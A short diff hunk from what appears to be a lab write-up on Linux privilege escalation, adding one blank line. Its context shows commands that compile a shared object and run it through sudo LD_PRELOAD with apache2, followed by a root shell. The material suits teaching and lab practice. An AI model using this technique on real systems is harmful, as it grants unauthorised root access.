@@ -34,6 +34,7 @@ then compile the file and generate the object file
 
     noobuser@attackdefense:~$ /usr/bin/gcc -fPIC -shared -o LD_PRELOAD_privesc.so LD_PRELOAD_privesc.c -nostartfiles
     noobuser@attackdefense:~$ sudo LD_PRELOAD=/tmp/LD_PRELOAD_privesc.so /usr/sbin/apache2
+    
     root@attackdefense:/tmp# id
     uid=0(root) gid=0(root) groups=0(root)
     
